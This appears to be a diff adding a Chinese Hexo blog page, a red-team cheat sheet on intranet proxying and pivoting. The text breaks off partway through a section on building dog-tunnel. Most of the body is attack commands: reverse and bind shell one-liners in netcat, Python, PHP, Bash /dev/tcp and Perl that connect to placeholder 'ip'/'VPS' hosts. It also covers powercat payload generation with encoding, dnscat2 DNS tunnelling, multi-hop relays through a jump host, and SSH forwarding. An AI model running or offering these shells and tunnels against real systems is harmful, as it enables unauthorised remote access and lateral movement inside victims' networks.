@@ -1,0 +1,1012 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"butnomingzi.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":true,"sidebar":{"position":"right","Muse | Mist":320,"Pisces | Gemini":240,"width":300,"display":"always","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+
+  <meta name="description" content="在用的内网代理。。。。。。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常用Proxy小结">
+<meta property="og:url" content="https://butnomingzi.github.io/posts/8949441d/index.html">
+<meta property="og:site_name" content="Tpp_Tgg">
+<meta property="og:description" content="在用的内网代理。。。。。。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-09-21T02:18:57.000Z">
+<meta property="article:modified_time" content="2020-09-21T02:19:41.750Z">
+<meta property="article:author" content="oudeniu">
+<meta property="article:tag" content="Proxy">
+<meta property="article:tag" content="总结">
+<meta property="article:tag" content="代理">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://butnomingzi.github.io/posts/8949441d/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>常用Proxy小结 | Tpp_Tgg</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Tpp_Tgg</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">32</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">3</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">16</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container"></div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="algolia-results">
+  <div id="algolia-stats"></div>
+  <div id="algolia-hits"></div>
+  <div id="algolia-pagination" class="algolia-pagination"></div>
+</div>
+
+      
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://butnomingzi.github.io/posts/8949441d/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="oudeniu">
+      <meta itemprop="description" content="一点都对，半点都没错。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tpp_Tgg">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          常用Proxy小结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-09-21 10:18:57 / 修改时间：10:19:41" itemprop="dateCreated datePublished" datetime="2020-09-21T10:18:57+08:00">2020-09-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/" itemprop="url" rel="index"><span itemprop="name">知识整理</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-users"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="firestore-visitors-count"></span>
+            </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>16k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>14 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>在用的内网代理。。。。。。</p>
+<a id="more"></a>
+
+<h1 id="代理小结"><a href="#代理小结" class="headerlink" title="代理小结"></a>代理小结</h1><p>先写这么多- - - - - - – </p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Jsb29kSG91bmRBRC9CbG9vZEhvdW5kL3JlbGVhc2VzL2Rvd25sb2FkLzMuMC4yL0Jsb29kSG91bmQtd2luMzIteDY0LnppcA==">https://github.com/BloodHoundAD/BloodHound/releases/download/3.0.2/BloodHound-win32-x64.zip<i class="fa fa-external-link-alt"></i></span></p>
+<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>免费工具。</p>
+<p>通过图形化方式将域内资源直观的展示，更好的分析域内情况。以便于更快的找到弱点。</p>
+<h4 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h4><ul>
+<li>Java环境</li>
+<li>Neo4j数据库</li>
+</ul>
+<p>配套域内信息搜集工具<span class="exturl" data-url="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Jsb29kSG91bmRBRC9CbG9vZEhvdW5kL21hc3Rlci9Jbmdlc3RvcnMvU2hhcnBIb3VuZC5leGU=">https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.exe<i class="fa fa-external-link-alt"></i></span></p>
+<h2 id="代理工具"><a href="#代理工具" class="headerlink" title="代理工具"></a>代理工具</h2><h3 id="NetCat"><a href="#NetCat" class="headerlink" title="NetCat"></a>NetCat</h3><p>在LinuxNC，弹回shell且无法切到bash时候。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h4><ul>
+<li>端口扫描</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -v ip port</span><br><span class="line">nc -v -z ip 1-1024</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>端口监听</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lpvv 9999</span><br><span class="line">客户端连接：nc -nvv ip port</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>文件传输</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vn ip port &lt; text.txt -q 1				# 与目标IP建立连接并传输给IP一个文件</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>正向shell</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务端</span></span><br><span class="line">nc -lpvv port -e /bin/bash</span><br><span class="line">nc -lpvv port -e c:\windows\system32\cmd.exe</span><br><span class="line"><span class="comment"># 客户端</span></span><br><span class="line">nc ip port </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>反向连接</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务端</span></span><br><span class="line">nc -lvvp port</span><br><span class="line"><span class="comment"># 客户端</span></span><br><span class="line">nc ip port -e /bin/bash</span><br><span class="line">nc ip port -e c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="其他语言连接NC"><a href="#其他语言连接NC" class="headerlink" title="其他语言连接NC"></a>其他语言连接NC</h4><ul>
+<li>python</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line">python -c <span class="string">&quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&quot;</span>VPS<span class="string">&quot;,6666))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>PHP</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>                                                                                     $sock = fsockopen(<span class="string">&quot;ip&quot;</span>,port);exec(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);<span class="meta">?&gt;</span> </span><br><span class="line">  </span><br><span class="line"> php -r <span class="string">&#x27;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Bash</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.90.93/9999 0&gt;&amp;1（内网主机执行）</span><br><span class="line">nc -lvv -p 5555（公网主机执行）</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.90.93/9999 0&gt;&amp;1</span><br><span class="line">正向连接：</span><br><span class="line">ncat -lvv -p 10000 -e /bin/bash (nc -lvv -p 6666 -c bash)</span><br><span class="line">nc -n ip port</span><br><span class="line"></span><br><span class="line">反向连接：</span><br><span class="line">nc -nv ip port -c bash</span><br><span class="line">nc -lvv -p port</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Per</li>
+</ul>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;ip&quot;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="PowerCat"><a href="#PowerCat" class="headerlink" title="PowerCat"></a>PowerCat</h3><p>根据名称即可知道，可配合Netcat也可单独用。（不过杀软）</p>
+<blockquote>
+<p>Set-ExecutionPolicy Unrestricted  # 设置允许所有ps脚本</p>
+</blockquote>
+<blockquote>
+<p>Import-Module powerboat.ps1  # 导入</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">地址：https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1</span><br><span class="line">使用方法</span><br></pre></td></tr></table></figure>
+
+<h4 id="参数："><a href="#参数：" class="headerlink" title="参数："></a>参数：</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">-l</span> <span class="comment"># 监听模式</span></span><br><span class="line"><span class="literal">-p</span> <span class="comment"># 端口</span></span><br><span class="line"><span class="literal">-e</span> <span class="comment"># 指定要启动的进程的名称</span></span><br><span class="line"><span class="literal">-v</span> <span class="comment"># 显示详情</span></span><br><span class="line"><span class="literal">-ep</span> <span class="comment"># 返回powershell</span></span><br><span class="line"><span class="literal">-c</span> <span class="comment"># 指定连接的IP地址</span></span><br><span class="line"><span class="literal">-of</span> <span class="comment"># 指定接受文件后的输出文件名</span></span><br><span class="line"><span class="literal">-i</span> <span class="comment"># 输入 可写文件名｜字符串</span></span><br><span class="line"><span class="literal">-g</span> <span class="comment"># 生成payload</span></span><br><span class="line"><span class="operator">-ge</span> <span class="comment"># 编码</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过NC的正向连接PowerCat.  (本地win10测试通过)</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">8080</span> <span class="literal">-e</span> cmd.exe <span class="literal">-v</span>			<span class="comment"># 可以指定powershell</span></span><br><span class="line">		</span><br><span class="line">nc ip <span class="number">8080</span> <span class="literal">-vv</span>			<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过nc反向连接</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvv -p 8888</span><br><span class="line"></span><br><span class="line">powercat -c ip -p port -v -e cmd.exe</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过powercat返回powershell </li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> port <span class="literal">-v</span></span><br><span class="line"></span><br><span class="line">powercat <span class="literal">-c</span> ip <span class="literal">-p</span> port <span class="literal">-v</span> <span class="literal">-ep</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过powercat传输文件</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">9999</span> <span class="literal">-of</span> test.txt <span class="literal">-v</span>  <span class="comment"># 接受</span></span><br><span class="line"></span><br><span class="line">powercat <span class="literal">-c</span> ip <span class="literal">-p</span> port <span class="literal">-i</span> c:\test.txt <span class="literal">-v</span>   <span class="comment"># 发送</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="生成Payload"><a href="#生成Payload" class="headerlink" title="生成Payload"></a>生成Payload</h4><p>用powercat生成的payload有正反区分且可以对其编码</p>
+<ul>
+<li>简单payload生成</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">8080</span> <span class="literal">-e</span> cmd <span class="literal">-v</span> <span class="literal">-g</span> &gt;&gt; shell.ps1  <span class="comment"># 将其输出到文件执行</span></span><br><span class="line">powercat <span class="literal">-c</span> ip <span class="literal">-p</span> port <span class="literal">-v</span></span><br><span class="line"></span><br><span class="line">powercat <span class="literal">-c</span> ip <span class="literal">-p</span> port <span class="literal">-ep</span> <span class="operator">-ge</span>	<span class="comment"># 生成编码的payload</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="DNS隧道通信"><a href="#DNS隧道通信" class="headerlink" title="DNS隧道通信"></a>DNS隧道通信</h4><p>其DNS通信基于dnscat，因此其服务端需要dnscat。如果实在不能安装，参考官网。。。</p>
+<p>这里仅仅是Debian Linux。客户端make时候报错，但是不影响。。。可以./dnscat测试一下是否正常。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务端</span></span><br><span class="line">apt-get install gem</span><br><span class="line">apt-get install ruby-dev</span><br><span class="line">apt-get install libpq-dev</span><br><span class="line">apt-get install ruby-bundler</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line"><span class="built_in">cd</span> dnscat2/server/</span><br><span class="line">gem install bundler</span><br><span class="line">bundle install</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端</span></span><br><span class="line">https://downloads.skullsecurity.org/dnscat2/ </span><br><span class="line">git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line"><span class="built_in">cd</span> dnscat2/client/</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruby ./dnscat2.rb ttpowercat.test <span class="literal">-e</span> open -<span class="literal">-no</span><span class="literal">-cache</span></span><br><span class="line"></span><br><span class="line">powercat <span class="literal">-c</span> ip <span class="literal">-p</span> port <span class="literal">-dns</span> ttpowercat.test <span class="literal">-e</span> cmd.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="跳板"><a href="#跳板" class="headerlink" title="跳板"></a>跳板</h4><ul>
+<li>TCP</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一台：目标机</span></span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-v</span> <span class="literal">-p</span> <span class="number">9999</span> <span class="literal">-e</span> cmd.exe   </span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二台：跳板机</span></span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-v</span> <span class="literal">-p</span> <span class="number">8000</span> <span class="literal">-r</span> tcp:目标机地址:<span class="number">9999</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三台:攻击者</span></span><br><span class="line">nc 跳板机地址 <span class="number">8000</span> <span class="literal">-v</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>DNS</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 跳板机</span></span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">8000</span> <span class="literal">-r</span> dns:攻击者::ttpowercat.test</span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击者</span></span><br><span class="line">./dnscat2.rb ttpowercat.test <span class="literal">-e</span> open -<span class="literal">-no</span><span class="literal">-cache</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标机</span></span><br><span class="line">powercat <span class="literal">-c</span> 跳板机 <span class="literal">-p</span> <span class="number">8000</span> <span class="literal">-v</span> <span class="literal">-e</span> cmd.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-C <span class="comment"># 压缩传输，提高速度</span></span><br><span class="line">-f <span class="comment"># SSh传输转到后台执行，不占用当前shell</span></span><br><span class="line">-N <span class="comment"># 建立静默连接(建立连接，看不到会话)</span></span><br><span class="line">-g <span class="comment"># 允许远程主机连接本地用于转发的端口</span></span><br><span class="line">-L <span class="comment"># 本地端口转发</span></span><br><span class="line">-R <span class="comment"># 远程端口转发</span></span><br><span class="line">-D <span class="comment"># 动态转发(SOCKS代理)</span></span><br><span class="line">-P <span class="comment"># 指定SSH端口</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>本地转发</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CFNg -L port(VPS):ip(目标机):port(目标机) root@ip(跳板机) </span><br><span class="line"><span class="comment"># VPS执行，将目标机端口转到VPS</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>远程端口转发</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CFNg -R port(VPS):ip(目标机):port(目标机) root@ip(vps) </span><br><span class="line"><span class="comment"># 内网跳板机执行，将内网目标机的端口转到VPS端口</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>动态转发</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CFNg -D port(VPS) root@ip(跳板机)</span><br><span class="line"><span class="comment"># SOCK4/5代理</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="dog-tunnel-lite"><a href="#dog-tunnel-lite" class="headerlink" title="dog-tunnel-lite"></a>dog-tunnel-lite</h3><h4 id="Linux编译"><a href="#Linux编译" class="headerlink" title="Linux编译"></a>Linux编译</h4><blockquote>
+<p> 我的Linux为debian_8_x64</p>
+</blockquote>
+<ul>
+<li>首先根据Github官方的文档，进行Linux版本编译x64。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">go get github.com/klauspost/reedsolomon</span><br><span class="line">go get github.com/cznic/zappy</span><br><span class="line">go get -u -d github.com/vzex/dog-tunnel &amp;&amp; cd $GOPATH/src/github.com/vzex/dog-tunnel/ &amp;&amp; git checkout udpVersion &amp;&amp; make</span><br><span class="line"><span class="meta">#</span><span class="bash"> 注意git checkout udpVersion 这个才是dog-tunnel-lite,如果git checkout master则是dog-tunnel</span></span><br></pre></td></tr></table></figure>
+
+<p>编译成功之后，会在<code>/usr/local/gopackage/src/github.com/vzex/dog-tunnel</code>文件夹下生成如下目录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@pq:&#x2F;usr&#x2F;local&#x2F;gopackage&#x2F;src&#x2F;github.com&#x2F;vzex# tree dog-tunnel&#x2F;</span><br><span class="line">dog-tunnel&#x2F;</span><br><span class="line">├── client.go</span><br><span class="line">├── common</span><br><span class="line">│   ├── cache.go</span><br><span class="line">│   ├── cache_test.go</span><br><span class="line">│   └── common.go</span><br><span class="line">├── dog-tunnel.png</span><br><span class="line">├── dtunnel_lite</span><br><span class="line">├── HowToUse.txt</span><br><span class="line">├── ikcp</span><br><span class="line">│   ├── ikcp.go</span><br><span class="line">│   ├── ikcp_h.go</span><br><span class="line">│   ├── ikcp_test.go</span><br><span class="line">│   └── ikcp_test_h.go</span><br><span class="line">├── Makefile</span><br><span class="line">├── pipe</span><br><span class="line">│   ├── pipe.go</span><br><span 